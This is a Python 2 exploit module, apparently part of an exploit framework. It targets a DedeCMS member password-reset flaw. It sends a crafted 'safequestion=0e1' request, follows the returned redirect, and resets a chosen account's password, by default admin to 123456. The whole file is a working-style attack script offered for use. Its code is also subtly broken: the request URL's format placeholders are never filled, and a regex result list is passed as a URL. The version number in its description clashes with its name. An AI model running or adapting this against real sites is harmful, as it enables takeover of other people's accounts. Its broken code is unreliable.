import requests
import re


def info(): # Exploit information for database mechanism
    info = {
        'name': 'dedecms_57_aue',
        'description': 'DEDEcms 5.2 arbitary user password modification',
        'date': '2018-12-27',
        'parameters': {
            'url': 'Target addr',
            'protocol': 'Protocol. Default: http',
            'username': 'Username. Default: admin',
            'password': 'Password. Default: 123456',
            'timeout': 'Request timeout. Default: 10',
            'userpage': 'Password changing page, Default: resetpassword.php'
        },
        'referer': 'https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_V5.7'
    }
    return info


class exploit():
    def __init__(self):
        self.param = {'url': None, 'protocol': 'http','username': 'admin', 'password': '123456', 'userpage': '/dede/member/resetpassword.php', 'timeout': 10}


    def exploit(self):
        try:
            sess = requests.Session()
            if not self.param['url']:
                print '[!] URL not specified.'
                return
            resp = sess.get('%s://%s/%s/?dopost=safequestion&safequestion=0e1&safeanwser=&id=1', timeout=int(self.param['timeout'])).text
            url = None
            url = re.findall('location=\'(.*)?\';', resp)
            if not url:
                print '[!] No location response, target seems not vulnerable.'
                return
            resp = sess.get(url, timeout=self.param['timeout'])
            sess.post(url, data={'username':self.param['username'], 'password':self.param['password']}, timeout=int(self.param['timeout']))
            print '[+] Exploit success, %s\'s password set to %s.' %(self.param['username'], self.param['password'])
            return
        except Exception, e:
            print '[!] Failed to exploit: %s' %(str(e))


    def info(self):
        ExpInf = info()
        print '[*] Incoming exploit information.'
        print ' |   NAME: %s' %(ExpInf['name'])
        print ' |   DESCRIPTION: %s' %(ExpInf['description'])
        print ' |   DATE: %s' %(ExpInf['date'])
        print ' |   PARAMETERS:'
        parameters = ExpInf['parameters']
        for item in ExpInf['parameters'].keys():
            print ' |   |  %s: %s' %(item, parameters[item])
        print ' |   REFERER: %s' %(ExpInf['referer'])
        return
